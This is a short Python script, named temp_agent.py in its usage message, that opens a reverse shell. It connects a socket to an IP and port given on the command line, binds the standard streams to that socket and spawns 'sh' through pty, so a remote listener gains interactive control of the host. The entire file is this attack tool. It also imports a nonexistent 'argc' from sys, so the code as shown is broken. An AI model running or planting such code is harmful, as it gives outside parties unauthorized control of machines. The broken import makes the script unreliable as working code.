import socket,subprocess,os
import pty
from sys import argv, argc

if argc != 3:
    print("Usage: python3 temp_agent.py <ip> <port>")
    exit(1)

ip = argv[1]
port = argv[2]
port = int(port)

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,port));os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
pty.spawn("sh")